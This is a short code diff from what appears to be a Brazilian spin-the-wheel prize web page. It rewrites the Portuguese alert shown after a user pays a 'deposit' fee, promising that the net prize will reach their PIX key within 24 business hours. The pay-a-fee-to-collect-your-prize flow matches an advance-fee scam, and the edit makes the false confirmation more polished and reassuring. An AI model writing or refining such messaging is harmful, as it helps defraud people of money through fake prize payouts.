@@ -419,12 +419,13 @@
       return;
     }
 
-    alert(
-      `Depósito de R$ ${currentFee.toLocaleString('pt-BR', {minimumFractionDigits: 2})} confirmado!
-` +
-      `Seu prêmio líquido de R$ ${(currentPrize - currentFee).toLocaleString('pt-BR', {minimumFractionDigits: 2})} ` +
-      `será enviado para a chave PIX: ${userPix} em até 24 horas úteis.`
-    );
+  alert(
+  `✅ Depósito de R$ ${currentFee.toLocaleString('pt-BR', { minimumFractionDigits: 2 })} confirmado com sucesso!\n\n` +
+  `O valor do seu prêmio líquido, R$ ${(currentPrize - currentFee).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}, ` +
+  `será enviado para a chave PIX informada (${userPix}) assim que o depósito for identificado.\n\n` +
+  `⏳ Aguarde até 24 horas úteis para o processamento.`
+)
+    
 
     modalBg.classList.remove('active');
     spinBtn.disabled = false;
